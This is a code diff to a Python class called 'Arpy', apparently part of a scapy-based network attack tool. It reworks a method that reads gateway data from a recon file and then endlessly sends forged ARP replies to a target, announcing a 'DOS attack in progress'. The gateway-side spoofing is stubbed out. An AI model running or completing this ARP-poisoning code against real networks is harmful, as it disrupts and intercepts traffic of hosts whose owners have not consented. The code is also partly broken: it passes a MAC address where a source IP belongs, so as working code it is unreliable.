@@ -26,8 +26,7 @@ class Arpy:
     """
     
     MODULE_NAME = "Arpy"
-    interval = None
-    two_way = False
+    LOCAL_MAC =  ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
 
     #Variables that should not be altered
     
@@ -38,11 +37,12 @@ class Arpy:
            :param gateway: IP address of gateway
         """
         self.target_mac = None 
-
+        self.interval = None
         self.target = target
         self.gateway = gateway
         self.frame = output_frame
         self.is_gateway = False
+        self.two_way = False
         
         if self.target == self.gateway:
            self.is_gateway = True
@@ -123,24 +123,32 @@ is_gateway: {self.is_gateway}
             pass
 
 
-    def inject_packet(self,uindex:int , interval:int):
+    def inject_packet(self):
             """Not implemented, need to be modified
             """
         
             try:
-                 unsolicited_arp_rep_to_tgt = ARP(op=2,psrc=parse.gateway_ip, pdst=self.__INDEX_TO_IP.get(uindex), hwdst=self.__IP_TO_MAC.get(self.__INDEX_TO_IP.get(uindex)))
-                 unsolicited_arp_rep_to_gtw = ARP(op=2,psrc=self.__INDEX_TO_IP.get(uindex), pdst=self.gateway, hwdst=self.__IP_TO_MAC.get(self.gateway), hwsrc=self.__LOCAL_MAC)
-                 count = 1
-                 stdout.write("DOS attack in progress. Press CTRL+C to end\n")
-                 
 
+                 with open(RECON_PATH, "r") as fp:
+                      data = json.load(fp)
+                 for key, value in data.items():
+                     if value.get("is_gateway") is True:
+                        GMAC = value.get("MAC")
+                        GIP = key
+                 unsolicited_arp_rep_to_tgt = ARP(op=2,psrc=GMAC, pdst=self.target, hwdst=self.target_mac)
+                 unsolicited_arp_rep_to_gtw = ARP(op=2,psrc=self.target, pdst=GIP, hwdst=GMAC, hwsrc=self.LOCAL_MAC)
+                 count = 1
+                 sys.stdout.write("DOS attack in progress. Press CTRL+C to end\n")
+                 
+                                                                     
                  while True :
                      send(unsolicited_arp_rep_to_tgt,verbose=False)
-                     if self.two_way_flag:
-                        send(unsolicited_arp_rep_to_gtw, verbose=False)
-                     stdout.write("   Packet(s) sent : {}\r".format(count))
+                     if self.two_way:
+                        # send(unsolicited_arp_rep_to_gtw, verbose=False)
+                        print("To router")
+                     sys.stdout.write("   Packet(s) sent : {}\r".format(count))
                      count += 1
-                     sleep(interval)
+                     sleep(self.interval)
             except KeyboardInterrupt:
                 print("\nUser ended program")
     
